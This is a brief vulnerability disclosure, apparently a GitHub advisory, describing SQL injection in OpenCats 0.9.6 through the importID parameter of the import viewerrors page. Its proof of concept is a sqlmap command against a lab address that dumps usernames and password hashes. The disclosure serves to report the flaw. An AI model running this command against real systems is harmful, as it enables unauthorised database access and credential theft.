#SQL injection vulnerability in OpenCats 'Import viewerrors' functionality.

OpenCats version 0.9.6 PHP7.2 suffers from SQL injection vulnerability. This allows attackers control over the application's database.

User has control over entriesPerPage variable, which allows SQL injection in SELECT statement via GET 'importID' parameter.

#Poc
Decided to test this with sqlmap. Let's exfiltrate username and password hashes from the database.  

```
sqlmap -u "http://192.168.203.135/opencats/index.php?m=import&a=viewerrors&importID=1" --cookie="CATS=cl2201l24aihqlnch0jgnr4pd2" -T user -C user_id,user_name,password -p "importID" --flush-session --dump
```

https://user-images.githubusercontent.com/57464251/193700025-eea03a93-4b73-4b44-8a38-d93913954a59.mp4
